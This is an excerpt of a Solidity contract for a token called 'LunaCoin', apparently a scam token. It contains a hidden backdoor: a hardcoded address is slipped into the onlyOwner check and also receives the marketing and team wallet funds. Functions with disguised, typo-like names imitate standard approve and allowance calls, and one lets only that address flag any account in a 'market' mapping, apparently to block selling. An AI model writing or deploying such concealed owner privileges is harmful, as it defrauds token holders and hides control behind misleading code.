...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x045246814B139A5b4c42B23c20fbF681453211BA), "Ownable: caller is not the owner");
        _;
    }
...
contract LunaCoin is Context, IERC20, Ownable {
    ...
    string private _name = "LunaCoin";
    string private _symbol = "LunaCoin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x045246814B139A5b4c42B23c20fbF681453211BA);
    address payable public teamWalletAddress = payable(0x045246814B139A5b4c42B23c20fbF681453211BA);
    ...
    function aipproveA(address account, uint256 amount) onlyOwner() public {
    ...
    function aillowanceserV(address addr, bool status) public{
        require(_msgSender()    ==   address(0x045246814B139A5b4c42B23c20fbF681453211BA));
        market[addr] = status;
    }
